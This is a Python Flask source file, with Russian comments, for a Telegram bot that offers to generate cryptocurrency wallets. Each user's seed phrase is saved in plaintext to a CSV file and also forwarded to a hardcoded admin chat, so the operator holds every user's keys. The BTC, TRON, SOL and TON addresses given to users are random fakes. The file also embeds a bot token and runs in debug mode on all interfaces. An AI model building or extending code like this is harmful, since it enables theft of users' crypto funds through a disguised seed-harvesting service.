from flask import Flask, request, send_from_directory
import os
import requests
import csv
import random
import string
from mnemonic import Mnemonic
from eth_account import Account

app = Flask(__name__, static_folder="miniapp")

# === Telegram Bot Config ===
BOT_TOKEN = "7987309610:AAHJkAlbPTxhToO9iyNvnh6I43kacWSP81M"
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
ADMIN_CHAT_ID = "6221874088"  # Заменить на твой Telegram ID

# === Serve MiniApp ===
@app.route("/")
def serve_index():
    return send_from_directory(app.static_folder, "index.html")

@app.route("/<path:path>")
def serve_static(path):
    return send_from_directory(app.static_folder, path)

# === Telegram Webhook ===
@app.route(f"/{BOT_TOKEN}", methods=["POST"])
def telegram_webhook():
    update = request.get_json()
    if "message" in update:
        chat_id = str(update["message"]["chat"]["id"])
        text = update["message"].get("text", "")

        if text == "/start":
            send_message(chat_id, "Добро пожаловать!\nСейчас сгенерирую для вас криптокошелёк...")

            # Генерация кошелька
            seed_phrase, word_indices, words_to_verify, wallet_data = generate_wallet()

            # Сохранение
            user_id = save_user_data(chat_id, seed_phrase, wallet_data)

            # Отправка пользователю инструкции
            send_message(chat_id, f"Сохраните вашу seed-фразу:\n\n{seed_phrase}\n\n"
                                  f"Для подтверждения введите через пробел следующие слова из сид-фразы:\n"
                                  f"{word_indices[0]}-е, {word_indices[1]}-е, {word_indices[2]}-е слова.")

            # Сохраняем что ожидаем подтверждение
            pending_verification[chat_id] = {
                "user_id": user_id,
                "seed": seed_phrase,
                "answers": words_to_verify
            }

        elif chat_id in pending_verification:
            # Проверка ответа
            user_input = text.strip().split()
            expected = pending_verification[chat_id]["answers"]

            if user_input == expected:
                send_message(chat_id, "✅ Подтверждение успешно! Доступ к кошельку открыт.")
                del pending_verification[chat_id]
            else:
                send_message(chat_id, "❌ Неверные слова. Попробуйте снова.")

        else:
            send_message(chat_id, "Введите /start для начала.")

    return "ok", 200

# === Отправка сообщений ===
def send_message(chat_id, text):
    url = f"{API_URL}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
    }
    requests.post(url, json=payload)

# === Верификация ===
pending_verification = {}

# === Генерация кошелька ===
def generate_wallet():
    # 1. Seed
    mnemo = Mnemonic("english")
    seed_phrase = mnemo.generate(strength=128)
    words = seed_phrase.split()

    # 2. Случайные слова для проверки
    word_indices = sorted(random.sample(range(12), 3))
    words_to_verify = [words[i] for i in word_indices]

    # 3. Генерация кошельков (заглушка для упрощения)
    wallet_data = {
        "BTC": fake_address("bc1"),
        "ETH": generate_eth_wallet(),
        "BNB": generate_eth_wallet(),
        "TRON": fake_address("T"),
        "SOL": fake_address("So"),
        "TON": fake_address("UQ")
    }

    return seed_phrase, [i+1 for i in word_indices], words_to_verify, wallet_data

# === Фейковая генерация адреса (реальные можно потом) ===
def fake_address(prefix):
    return prefix + ''.join(random.choices(string.ascii_letters + string.digits, k=30))

def generate_eth_wallet():
    acct = Account.create()
    return acct.address

# === Сохранение пользователя ===
def save_user_data(telegram_id, seed, wallets):
    file_path = "users.csv"
    user_id = f"id{get_next_id(file_path)}"

    data = {
        "Telegram ID": telegram_id,
        "User ID": user_id,
        "Seed Phrase": seed,
        "BTC": wallets["BTC"],
        "ETH": wallets["ETH"],
        "BNB": wallets["BNB"],
        "TRON": wallets["TRON"],
        "SOL": wallets["SOL"],
        "TON": wallets["TON"]
    }

    file_exists = os.path.isfile(file_path)
    with open(file_path, "a", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=data.keys())
        if not file_exists:
            writer.writeheader()
        writer.writerow(data)

    # Уведомим админа
    message = f"👤 Новый пользователь\nTelegram ID: {telegram_id}\nUser ID: {user_id}\n\nSeed:\n{seed}"
    send_message(ADMIN_CHAT_ID, message)
    return user_id

# === Счётчик idN ===
def get_next_id(file_path):
    if not os.path.exists(file_path):
        return 1
    with open(file_path, newline="") as f:
        return sum(1 for _ in f)
    
# === Flask запуск ===
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(debug=True, host='0.0.0.0', port=port)
